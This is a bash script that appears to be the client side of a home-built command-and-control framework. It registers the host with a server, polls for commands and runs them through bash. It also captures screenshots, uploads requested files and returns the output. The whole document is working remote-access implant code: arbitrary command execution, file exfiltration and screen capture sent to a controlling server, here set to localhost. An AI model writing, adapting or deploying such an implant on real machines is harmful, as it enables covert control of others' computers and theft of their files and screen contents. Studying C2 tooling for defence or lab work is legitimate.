#!/bin/bash

SERVER_URL="http://localhost:8080"
AGENT_ID="agentx"
AGENT_OS=$(uname)
AGENT_IP=$(hostname -I | awk '{print $1}')
AGENT_STATUS="ACTIVE"

#FUNCTION FOR REGISTERING
register_agent(){
curl -s -X POST "$SERVER_URL/agents" \
	-H "Content-Type: application/json" \
	-d "{
           \"agentId\": \"${AGENT_ID}\",
           \"agentIp\": \"${AGENT_IP}\",
           \"agentOs\": \"${AGENT_OS}\",
           \"agentStatus\": \"${AGENT_STATUS}\"
}"
}

#FETCHING COMMAND
fetch_command(){
	curl -s "$SERVER_URL/commands/agents/$AGENT_ID/pending"
}


#SENDING COMMAND RESULT
send_result(){
	local command_id="$1"
	local result_output="$2"

	curl -s -X POST "$SERVER_URL/results/save" \
		--data-urlencode "agentId=${AGENT_ID}" \
		--data-urlencode "commandId=${command_id}" \
		--data-urlencode "resultText=${result_output}"
}

update_command_status(){
	local command_id="$1"
	curl -s -X PUT "$SERVER_URL/commands/assign/$command_id/EXECUTED"
}

take_screenshot() {
  FILE="/tmp/screenshot_$(date +%s).png"
  scrot "$FILE"

  if [[ ! -f "$FILE" ]]; then
    echo "[!] Screenshot failed."
    return
  fi

  echo "[*] Encoding screenshot..."

  # base64 the file directly to a temp file
  base64 "$FILE" > /tmp/encoded.txt

  echo "[*] Uploading screenshot..."

  # Use a here-document with --data-binary to avoid argument size limits
  curl -s -X POST "$SERVER_URL/screenshots/upload" \
    -H "Content-Type: application/json" \
    --data-binary @- <<EOF
{
  "agentId": "$AGENT_ID",
  "screenshotData": "$(cat /tmp/encoded.txt | tr -d '\n')"
}
EOF

  echo "[+] Screenshot uploaded."

  # Cleanup
  rm "$FILE" /tmp/encoded.txt
}

upload_file() {
  local filepath="$1"
  if [[ ! -f "$filepath" ]]; then
    echo "[!] File not found: $filepath"
    return 1 # Indicate failure
  fi
  echo "[*] Uploading $filepath to server..."
  curl -s -X POST "$SERVER_URL/files/upload" \
    -F "file=@${filepath}" \
    -F "agentId=${AGENT_ID}"
  return 0 # Indicate success
}


register_agent

CURRENT_DIR="$HOME"

while true; do
  echo "[*] Checking for commands..."
  response=$(fetch_command)

  command=$(echo "$response" | jq -r '.[0].command')
  command_id=$(echo "$response" | jq -r '.[0].commandId')

  if [[ "$command" != "null" && "$command_id" != "null" ]]; then
    echo "[*] Executing command: $command"
    if [[ "$command" == "screenshot" ]]; then
      echo "[*] Taking screenshot..."
      take_screenshot
      result="Screenshot taken"
    elif [[ "$command" == fetch_file* ]]; then
      filepath="${command#fetch_file }"
      if upload_file "$filepath"; then
        result="File uploaded: $filepath"
      else
        result="File upload failed: $filepath"
      fi
    elif [[ "$command" == cd* ]]; then
      new_dir=$(echo "$command" | cut -d' ' -f2-)
      if cd "$CURRENT_DIR" && cd "$new_dir" 2>/dev/null; then
        CURRENT_DIR=$(cd "$CURRENT_DIR" && cd "$new_dir" && pwd)
        result="Changed directory to $CURRENT_DIR"
      else
        result="Failed to change directory"
      fi
    else
      output=$(cd "$CURRENT_DIR" && bash -c "$command" 2>&1)
      result=$(echo "$output" | base64 -w 0)
    fi

    echo "[*] sending result..."
    send_result "$command_id" "$result"

    echo "[*] Marking command as EXECUTED..."
    update_command_status "$command_id"
  else
    echo "[*] No command found. Sleeping..."
  fi

  sleep 1
done




